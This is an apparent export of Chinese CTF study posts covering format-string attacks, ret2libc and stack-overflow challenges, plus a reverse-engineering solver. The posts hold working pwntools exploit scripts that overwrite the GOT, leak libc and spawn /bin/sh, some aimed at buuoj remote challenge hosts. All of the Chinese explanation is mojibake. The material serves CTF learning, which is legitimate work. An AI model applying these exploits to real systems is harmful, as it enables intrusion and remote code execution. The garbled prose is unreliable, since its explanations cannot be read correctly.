(ç¼–è¯‘æ—¶ç¡®å®š) p32(addr) ä½ç½® æ”¾åœ¨ payload çš„å¼€å¤´ æ”¾åœ¨ payload çš„æœ«å°¾ %n åç§» 8$ (å› ä¸ºåœ°å€æ”¾åœ¨å¼€å¤´ï¼Œä¸”åœ¨ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®) 10$ (å› ä¸ºåœ°å€æ”¾åœ¨æœ«å°¾ï¼Œä¸”åœ¨ç¬¬ 10 ä¸ªå‚æ•°ä½ç½®) ä¸»è¦è€ƒé‡ ç¡®ä¿ p32(addr) ä¸è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œä¸”åœ¨æ­£ç¡®åç§» é¿å… b_addr å­—èŠ‚è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œæ›´ç¨³å®šåœ°ä½œä¸ºå‚æ•°åœ°å€ å¥½çš„ï¼Œå¦‚æœä½ ç¡®è®¤è¿™ä¸ª b æ˜¯å¿…é¡»çš„ï¼Œé‚£ä¹ˆå®ƒåœ¨ payload ä¸­çš„å­˜åœ¨ï¼Œå°±æ„å‘³ç€å®ƒåœ¨æ ˆçš„å¸ƒå±€å’Œ printf å¯¹å‚æ•°çš„è§£æä¸­èµ·åˆ°äº†å…³é”®ä½œç”¨ï¼Œé€šå¸¸æ˜¯ä¿è¯äº† p32(b_addr) çš„æ­£ç¡®å¯¹é½ï¼Œä½¿å…¶è½åœ¨ %10$n é¢„æœŸçš„å‚æ•°ä½ç½®ã€‚ è®©æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æï¼Œä¸ºä»€ä¹ˆå¤šä¸€ä¸ª b åè€Œå¯èƒ½æˆä¸ºâ€œå¿…é¡»çš„â€ã€‚ æœ‰ b çš„è¯¦ç»†åˆ†æ 1payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr) è®©æˆ‘ä»¬è®¡ç®—æ¯ä¸ªéƒ¨åˆ†çš„é•¿åº¦ï¼š b&quot;aa&quot;ï¼š2 å­—èŠ‚ b&quot;%10$n&quot;ï¼š5 å­—èŠ‚ b&quot;b&quot;ï¼š1 å­—èŠ‚ p32(b_addr)ï¼š4 å­—èŠ‚ (å‡è®¾ b_addr æ˜¯ 0x0804A028) æ€»å­—èŠ‚æ•° &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 å­—èŠ‚,åœ¨è¿™é‡Œï¼Œbæ˜¯ä¸ºäº†è¡¥è¶³å­—èŠ‚ cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰ è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè€ƒè™‘é€å­—èŠ‚å†™å…¥ è¿™é‡Œæƒ³æŠŠcè¦†ç›–ä¸º0x12345678ï¼Œè€Œcçš„åœ°å€æ˜¯0x0804A02Cï¼Œæ‰€ä»¥åŸºæœ¬ç›®æ ‡æ˜¯ï¼š 12340x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12 è„šæœ¬ 1234567891011121314from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info: print(b&quot;Success&quot;)p.interactive() fmtstr_payloadfmtstr_payload æ˜¯ pwntools æä¾›çš„ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…· ï¼Œç”¨äºæ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆFormat String Vulnerabilityï¼‰çš„ payload ã€‚ å®ƒçš„ä½œç”¨æ˜¯ï¼š è‡ªåŠ¨è®¡ç®—å­—ç¬¦æ•°å¹¶æ„é€  payloadï¼Œç”¨äºå†™å…¥ä»»æ„åœ°å€çš„å€¼ï¼ˆå¦‚ GOT è¡¨ã€å˜é‡ã€è¿”å›åœ°å€ç­‰ï¼‰ ğŸ§ª fmtstr_payload çš„ä½¿ç”¨æ–¹æ³• åŸºæœ¬è¯­æ³• 12from pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) å‚æ•°è¯´æ˜ offset æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼ˆä½ çš„è¾“å…¥åœ¨ç¬¬å‡ ä¸ª%pçš„ä½ç½®ï¼‰ writes ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºä½ è¦å†™å…¥çš„åœ°å€å’Œå€¼ï¼Œå¦‚&#123;addr1: value1, addr2: value2&#125; numbwritten å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ï¼ˆé»˜è®¤ä¸º 0ï¼Œå¯ä»¥å¿½ç•¥ï¼‰ write_size å†™å…¥å¤§å°ï¼Œå¯é€‰ï¼š&#39;byte&#39;ã€&#39;short&#39;ã€&#39;int&#39;ï¼ˆé»˜è®¤æ˜¯&#39;byte&#39;ï¼‰ ğŸ§© ç¤ºä¾‹ 1ï¼šå†™å…¥ä¸€ä¸ªåœ°å€ä¸º 16 123456789101112from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8 # åç§»é‡addr = elf.symbols[&#x27;a&#x27;] # å‡è®¾ä½ è¦å†™å…¥å˜é‡ a çš„åœ°å€# æ„é€  payloadï¼šå†™å…¥ a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() ğŸ§© ç¤ºä¾‹ 2ï¼šå†™å…¥å¤šä¸ªåœ°å€ï¼ˆå¦‚ a=16, b=2, c=0x12345678ï¼‰ 12345678910111213141516171819from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# æ„é€  payloadï¼šå†™å…¥å¤šä¸ªåœ°å€writes = &#123; a_addr: 16, b_addr: 2, c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() fmt_demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰ æ‰€ä»¥å¯ä»¥å…ˆæ³„éœ²libcçš„åŸºå€ï¼Œå¾—åˆ°systemå‡½æ•°çš„åœ°å€ å¤ªæ ¹æ®æ­¤æŠŠprintfçš„gotè¡¨å­˜å‚¨çš„åœ°å€æ¢ä¸ºsystemå‡½æ•°çš„åœ°å€ ä¹‹åè¾“å…¥å‚æ•°â€œ&#x2F;bin&#x2F;shâ€,å°±å¯ä»¥å®ç° è„šæœ¬ 12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive() é‚£ä¸ºä»€ä¹ˆè¿˜è¦å¡«è¡¥ payload çš„é•¿åº¦ä¸º 0x100 å­—èŠ‚ï¼Ÿâ€ æˆ‘ä»¬æ¥ä» â€œpayload è¢«å¤åˆ¶åˆ°æ ˆä¸Šâ€ è¿™ä¸ªç°è±¡å‡ºå‘ï¼Œè§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬æœ‰æ„åœ° å°† payload å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œå°½ç®¡å®ƒå¯èƒ½ä¼šè¢«å¤åˆ¶åˆ°æ ˆä¸Šã€‚ âœ… ç®€çŸ­å›ç­”ï¼š æˆ‘ä»¬å¡«è¡¥ payload åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œæ˜¯ä¸ºäº†è®© payload è¢«å®Œæ•´å¤åˆ¶åˆ°æ ˆä¸Šï¼Œä»è€Œè®©åç§»å›ºå®šã€å¸ƒå±€å¯æ§ï¼Œä¾¿äºåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œåœ°å€æ³„éœ²æˆ–å†™å…¥æ“ä½œã€‚ ğŸ“Œ payload çš„ä¸¤ç§â€œå‘½è¿â€ï¼š 1ï¸âƒ£ payload çŸ­ &lt; ä¸€äº›å‚æ•°é•¿åº¦ printfä»æ ˆä¸Šè¯»å–å‚æ•° payload åœ¨ buf ä¸­ï¼Œå‚æ•°åœ¨æ ˆä¸Š 2ï¸âƒ£ payload é•¿ &gt; ä¸€å®šé•¿åº¦ï¼ˆå¦‚ 100 å­—èŠ‚ï¼‰ printfæŠŠ payload å¤åˆ¶åˆ°æ ˆä¸Š payload æœ¬èº«å°±åœ¨æ ˆä¸Š ğŸ§© ä¸ºä»€ä¹ˆè¦â€œæ•…æ„â€è®© payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Ÿ âœ… ä¼˜ç‚¹ä¸€ï¼šåç§»å›ºå®šï¼Œä¾¿äºè°ƒè¯• payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šåï¼Œå®ƒåœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯å›ºå®šçš„ã€‚ æˆ‘ä»¬å¯ä»¥ç²¾å‡†æ§åˆ¶åç§»ï¼ˆæ¯”å¦‚ %4$s å°±ä¸€å®šè¯»å– payload ä¸­çš„åœ°å€ï¼‰ã€‚ é¿å…äº†å›  payload é•¿åº¦ä¸åŒå¯¼è‡´åç§»å˜åŒ–çš„é—®é¢˜ã€‚ âœ… ä¼˜ç‚¹äºŒï¼šä¾¿äºæ„é€ å†™å…¥æ“ä½œï¼ˆå¦‚ %nï¼‰ å½“æˆ‘ä»¬æƒ³ç”¨ %n å†™æŸä¸ªåœ°å€æ—¶ï¼Œéœ€è¦ç¡®ä¿åœ°å€åœ¨æ ˆä¸Šï¼Œä¸”åç§»å›ºå®šã€‚ å¦‚æœ payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠåœ°å€æ”¾åœ¨ payload å¼€å¤´ï¼Œç„¶åç”¨ %1$n ç²¾å‡†å†™å…¥ã€‚ âœ… ä¼˜ç‚¹ä¸‰ï¼šé˜²æ­¢ payload è¢«æˆªæ–­æˆ–åç§»æ¼‚ç§» å¦‚æœ payload é•¿åº¦ä¸å›ºå®šï¼Œå¯èƒ½å¯¼è‡´åç§»å˜åŒ–ï¼Œ%sã€%n è¯»å†™é”™è¯¯åœ°å€ã€‚ å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100ï¼‰å¯ä»¥é¿å…è¿™ç§æ¼‚ç§»ã€‚ :grey_question:ä½†æˆ‘å…¶å®ä¸å¤ªç†è§£","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"ret2libc-printf","slug":"HarekazeCTF2019-baby-rop2","date":"2025-07-20T06:53:58.000Z","updated":"2025-07-20T09:27:47.719Z","comments":true,"path":"2025/07/20/HarekazeCTF2019-baby-rop2/","permalink":"http://example.com/2025/07/20/HarekazeCTF2019-baby-rop2/","excerpt":"","text":"ä¸¥æ ¼ç¬¦åˆprintfçš„æ ¼å¼[HarekazeCTF2019]baby_rop2 è€Œä¸”å‡½æ•°ä¸­æ²¡æœ‰systemå‡½æ•°å’Œç›¸åº”å­—ç¬¦ä¸² è¦æ³„éœ²libcçš„åœ°å€ é€šè¿‡readè¯»å–æ•°æ®ï¼Œç”¨printfæ‰“å°å‡ºæ¥ printf å‡½æ•°çš„ GOT åœ°å€ä¸èƒ½ç”¨æ¥æ³„éœ² printf è‡ªå·±çš„åœ°å€ï¼Ÿ æ˜¯çš„ï¼Œè¿™æ˜¯ä¸ªé¸¡ç”Ÿè›‹è›‹ç”Ÿé¸¡ çš„é—®é¢˜ï¼š printf@got ä¿å­˜çš„æ˜¯ printf çš„çœŸå®åœ°å€ï¼ˆlibc ä¸­çš„åœ°å€ï¼‰ã€‚ ä½†ä½ è¦è°ƒç”¨ printf æ‰èƒ½æ‰“å°å®ƒï¼Œè€Œè°ƒç”¨ printf åˆä¾èµ– GOT è¡¨é¡¹çš„åœ°å€ã€‚ å¦‚æœ GOT è¡¨é¡¹è¿˜æ²¡è§£æï¼ˆå»¶è¿Ÿç»‘å®šï¼‰ï¼Œå®ƒæŒ‡å‘ PLT stubï¼Œä¸æ˜¯çœŸå®åœ°å€ã€‚ å³ä½¿ GOT è¡¨é¡¹å·²è§£æï¼Œä½ ä¹Ÿæ— æ³•é€šè¿‡ printf(&quot;%s&quot;, printf_got) æ­£ç¡®è¯»å–åœ°å€ã€‚ ğŸ§  æ€»ç»“å¯¹æ¯” puts(puts_got) âœ… å¯è¡Œ putsä¼šå°è¯•æ‰“å°ä»puts_gotå¼€å§‹çš„å†…å®¹ï¼Œlibc ä¸­æœ‰å­—ç¬¦ä¸²ï¼Œä¸ä¼šå´©æºƒ printf(&quot;%s&quot;, printf_got) âŒ ä¸å¯è¡Œ printfä¼šå°è¯•ä»printf_gotåœ°å€è¯»å–å­—ç¬¦ä¸²ï¼Œä½†é‚£æ˜¯ä¸ªå‡½æ•°åœ°å€ï¼Œä¸æ˜¯å­—ç¬¦ä¸² printf(&quot;%p&quot;, printf_got) âœ… å¯è¡Œï¼ˆéœ€æ„é€ ï¼‰ å¯ä»¥æ‰“å°åœ°å€ï¼Œä½†éœ€è¦æ­£ç¡®è®¾ç½®æ ¼å¼å­—ç¬¦ä¸² printf(&quot;%s&quot;, read_got) âœ… å¯è¡Œï¼ˆå¶å°”ï¼‰ read_gotæŒ‡å‘çš„åœ°å€é™„è¿‘å¯èƒ½æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰“å°å‡ºæ¥ puts(printf_got) âœ… å¯è¡Œï¼ˆå¶å°”ï¼‰ åŒä¸Šï¼Œä½†ä¾èµ– libc ä¸­çš„å­—ç¬¦ä¸² è¦è°ƒç”¨printfå‡½æ•°è¿›è¡Œæ³„éœ²ï¼Œå°±è¦æ ¹æ®å…¶ç‰¹æ€§æ¥ä¼ å‚ï¼Œprintfå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªå¯å˜å‚æ•°åˆ—è¡¨ RDIã€RSIã€RDXã€RCXã€R8ã€R9å‚æ•°æŒ‰ç…§è¿™ä¸ªé¡ºåºä¼ å…¥å¯„å­˜å™¨ä¸­ æœ‰å•ç‹¬çš„rdi æ‰€ä»¥rdi&#x3D;0x400733 ä½†æ²¡æœ‰å•ç‹¬å¯¹rsiçš„å¤„ç† æ‰€ä»¥rsi_r15&#x3D;0x400731ï¼Œå¯¹r15éšä¾¿ä¼ å…¥ä¸€ä¸ªæ•°å°±å¯ ç¬¬ä¸€æ¬¡payloadçš„æ„é€  12345678910payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read)) ç¬¬äºŒæ¬¡é€šè¿‡è®¡ç®—å‡ºlibcçš„åŸºå€ï¼ŒåŠ ä¸Šåç§»é‡å°±å¾—åˆ°äº†éœ€è¦çš„å‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä¸iè¿›è¡Œæ„é€ äº† 1payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770 ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive() å•ä¸ªå‡½æ•°pwn2_sctf_2016 é¦–å…ˆçœ‹åˆ°é¢˜ç›®è¾“å…¥ä¸€ä¸ªå°äº32çš„æ•°ï¼Œå¹¶æŠŠè¿™ä¸ªæ•°å½“ä½œgetè¾“å…¥çš„æœ€å¤§é™åˆ¶ æ‰€ä»¥å¯ä»¥è¾“å…¥ä¸€ä¸ªè´Ÿæ•°æ¥è§£å†³è¿™ä¸ªé™åˆ¶ ä¹Ÿæ˜¯æ²¡æœ‰systemå‡½æ•°çš„ç›¸å…³å†…å®¹ è€ƒè™‘æ³„éœ²libcçš„åœ°å€ :detective:ç”¨printfæ‰“å°ï¼Œå¯ä»¥ç”¨printfçš„gotè¡¨ã€ å› ä¸ºä½ è°ƒç”¨äº† printf(printf_got)ã€‚ å¯¹äº printf æ¥è¯´ï¼š å®ƒçœ‹ä¸åˆ°è¿™æ˜¯ä¸€ä¸ªæ•´æ•°åœ°å€ å®ƒåªæ˜¯æŠŠä½ ç»™çš„æŒ‡é’ˆå½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼è§£æ å¦‚æœä½ ä¼ å…¥çš„è¿™ä¸ªåœ°å€æ˜¯å¯è¯»çš„å†…å­˜ï¼Œå®ƒå°±ä¼šæŒ‰ç…§é‚£å—å†…å­˜çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²å»è¾“å‡º æ‰€ä»¥å¦‚æœåªæ˜¯ä¼ ä¸€ä¸ªå‚æ•°ï¼Œprintfå‡½æ•°ä¼šåˆšå¥½æŠŠå®ƒå½“ä½œå­—ç¬¦ä¸² åˆšå¥½è§£å†³äº†ä¼ é€’å®ƒæœ¬èº«çš„gotè¡¨åœ°å€ï¼Œå’Œåªæœ‰ä¸€ä¸ªå‚æ•°çš„é—®é¢˜ 1payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got) ä¹‹åå°±æ˜¯æ ‡å‡†æµç¨‹ å°±æ˜¯è®°å¾—è¿”å›åœ°å€æ˜¯mainå‡½æ•° è¦å†æ¬¡è¾“å…¥ä¾æ¬¡é‚£ä¸ªè´Ÿæ•° è„šæœ¬ 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#æ¥å—libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"}]},{"title":"ciscn_2019_es_2","slug":"ciscn-2019-es-2","date":"2025-07-18T11:03:47.000Z","updated":"2025-07-18T12:19:36.079Z","comments":true,"path":"2025/07/18/ciscn-2019-es-2/","permalink":"http://example.com/2025/07/18/ciscn-2019-es-2/","excerpt":"","text":"æ¯æ¬¡åªèƒ½è¯»å–0x30ä¸ªå­—ç¬¦ï¼Œåˆ°ebpçš„è·ç¦»æ˜¯0x28ï¼Œå·®æ¯”è¾ƒå°ï¼Œä¸æ–¹ä¾¿æ„é€ ropé“¾ï¼Œ system_addr&#x3D;0x80048400","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"printf","slug":"printf","permalink":"http://example.com/tags/printf/"}]},{"title":"bjdctf_2020_babystack2","slug":"bjdctf-2020-babystack2","date":"2025-07-18T09:18:45.000Z","updated":"2025-07-18T09:30:00.120Z","comments":true,"path":"2025/07/18/bjdctf-2020-babystack2/","permalink":"http://example.com/2025/07/18/bjdctf-2020-babystack2/","excerpt":"","text":"åªæœ‰nxä¿æŠ¤ readæ˜¯æ ˆæº¢å‡ºæ¼æ´ ä¸”å‡½æ•°ä¸­å­˜åœ¨åé—¨å‡½æ•° åˆ†æä¸»å‡½æ•° è¾“å…¥é•¿åº¦nbytesï¼ˆè¦æ±‚å°äº10ï¼‰ ä½†æ˜¯è§‚å¯Ÿåˆ°åé¢çš„readå‡½æ•°æœ€å¤šè¯»å–nbytesgä¸ªå­—èŠ‚åˆ°bufä¸­ 10ä¸ªå­—èŠ‚æ— æ³•å®ç°æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€ åˆè§‚å¯Ÿåˆ° (unsigned int)nbytesæ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œæ‰€ä»¥ç”¨è´Ÿæ•°ä¼šè½¬åŒ–ä¸ºæ— ç©·å¤§çš„å€¼ è„šæœ¬ 1234567891011from pwn import *#p=process(&quot;./bjdctf_2020_babystack2&quot;)#gdb.attach(p,&quot;b*0x400826&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28556)p.recvuntil(b&quot;name:\\n&quot;)p.sendline(str(-1))p.recvuntil(b&quot;name?\\n&quot;)exit=0x6010b8payload=b&#x27;a&#x27;*(0x10+8)+p64(0x400726)p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"æ ˆæº¢å‡º","slug":"æ ˆæº¢å‡º","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]},{"title":"Youngter-drive","slug":"Youngter-drive","date":"2025-07-17T12:30:33.000Z","updated":"2025-07-18T01:22:32.276Z","comments":true,"path":"2025/07/17/Youngter-drive/","permalink":"http://example.com/2025/07/17/Youngter-drive/","excerpt":"","text":"å¯ä»¥çœ‹å‡ºæ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ çº¿ç¨‹åˆ†æ1::hObject = CreateMutexW(0, 0, 0); ç›®çš„ï¼š åˆ›å»ºä¸€ä¸ª Mutexï¼ˆäº’æ–¥é”ï¼‰ï¼Œçº¿ç¨‹ä¹‹é—´è®¿é—®å…±äº«èµ„æºæ—¶ç”¨å®ƒæ¥ä¿æŠ¤æ•°æ®ã€‚ ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¼šè¯»å†™å…¨å±€å˜é‡ï¼Œæ¯”å¦‚ Destï¼ˆflag å­˜æ”¾çš„åœ°æ–¹ï¼‰ã€lenã€‚ å¦‚æœä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å†™å…¥&#x2F;è¯»å†™ï¼Œä¼šé€ æˆæ•°æ®é”™ä¹±ï¼Œæ‰€ä»¥éœ€è¦äº’æ–¥é”æ¥åŒæ­¥ã€‚ å½“ä¸€ä¸ªçº¿ç¨‹æ‹¿åˆ° Mutex åï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å¿…é¡»ç­‰å®ƒé‡Šæ”¾ Mutex æ‰èƒ½è¿›å…¥å…³é”®åŒºã€‚ 12hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0); åˆ›å»ºçº¿ç¨‹ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ”¹çº¿ç¨‹è¦æ‰§è¡Œçš„å‡½æ•°çš„å‡½æ•°å…¥å£ 12CloseHandle(hObject);CloseHandle(Thread); å…³é—­çº¿ç¨‹å¥æŸ„ï¼ˆåªæ˜¯é‡Šæ”¾å¥æŸ„èµ„æºï¼‰ çº¿ç¨‹æœ¬èº«ä¾ç„¶åœ¨åå°è¿è¡Œï¼Œç­‰å®ƒä»¬çš„å‡½æ•°è¿”å›æ—¶ï¼Œçº¿ç¨‹è‡ªç„¶ç»“æŸã€‚ ï¼ˆæ³¨æ„ï¼šè¿™é‡Œå…³é—­çš„æ˜¯å¥æŸ„ï¼Œä¸æ˜¯çº¿ç¨‹æœ¬èº«ï¼‰ 1CloseHandle(::hObject); é‡Šæ”¾èµ„æº ç»“æŸ ä¸»çº¿ç¨‹ åƒ å¯¼æ¼”ï¼Œè´Ÿè´£åè°ƒæ•´ä¸ªæµç¨‹ï¼š è®©ç”¨æˆ·è¾“å…¥ flagï¼ˆsub_4110FFï¼‰ã€‚ åˆ›å»ºä¸¤ä¸ªâ€œå·¥äººâ€ï¼ˆçº¿ç¨‹1å’Œçº¿ç¨‹2ï¼‰ï¼š å·¥äºº1ï¼ˆåŠ å¯†çº¿ç¨‹ï¼‰ï¼šå¯¹ flag è¿›è¡ŒåŠ å¯†ã€‚ å·¥äºº2ï¼ˆè½®æ•°æ§åˆ¶çº¿ç¨‹ï¼‰ï¼šæ§åˆ¶åŠ å¯†çš„è½®æ•°ã€‚ å¯¼æ¼”ç­‰å¾…å·¥äººå®Œæˆä»»åŠ¡ï¼ˆwhile (len != -1)ï¼‰ã€‚ å·¥äººå®Œæˆåï¼Œå¯¼æ¼”è¾“å‡ºç»“æœï¼ˆsub_411190ï¼‰ã€‚ å‡½æ•°åˆ†æStartAddress å¯ä»¥çœ‹åˆ°æ¯æ¬¡æ‰§è¡Œæ—¶lenä¼šå‡1 æ‰“å¼€åå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªåŠ å¯†æ“ä½œ a1æ—¶æˆ‘ä»¬è¾“å…¥çš„flag,a2å¾…ä¼šå„¿åˆ†æå¾—åˆ°ä»–æ˜¯29 åˆ†æå¾—åˆ° å€’ç€ï¼Œä»flagçš„æœ€åä¸€ä½å¼€å§‹ï¼Œåˆ†ä¸ºä¸¤ç§åŠ å¯†ï¼Œä¸ºå°å†™å­—ç¬¦å’Œéå°å†™å­—æ¯æ—¶ sub_41119F åªå‡å°‘len,ä¸æ”¹å˜å­—ç¬¦ lenæ•°å€¼ çœ‹ç€åé¢çš„æ ‡æ³¨å¯ä»¥çœ‹åˆ°0x1Dæ˜¯29ï¼Œåˆšå¥½ç­‰äºåé¢çš„æ ‡æ³¨TOiZiZtOrYaToUwPnToBsOaOapsySçš„é•¿åº¦ å¯ä»¥çŒœæƒ³è¿™ä¸ªlenç›¸å½“äºå¯†æ–‡çš„ä¸‹æ ‡ ä¸”åŠ å¯†åçš„æ•°å€¼æ˜¯ flagæœ‰30ä½ è„šæœ¬æ€è·¯ï¼ŒæŠŠTOiZiZtOrYaToUwPnToBsOaOapsySé€†å›å» ä¸çŸ¥é“æ˜¯æŠ€å¥‡æ•°ä½è¿˜æ˜¯å¶æ•°ä½ï¼Œi %2 &#x3D;&#x3D; 1ä¹Ÿå°è¯•ä¸€ä¸‹ è„šæœ¬ 123456789101112131415161718192021off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;print(len(off_418004))flag=&#x27;&#x27;for i in range(len(off_418004)): if i %2 == 0: flag += off_418004[i] continue for j,k in enumerate(off_418000): if off_418004[i] == k: if chr(j+38).isupper(): flag += chr(j+38) else: flag += chr(j+96)print(flag)print(chr(off_418000[29]))#ThisisthreadofwindowshahaIsES è¾“å‡ºäº†29ä¸ªå­—ç¬¦ 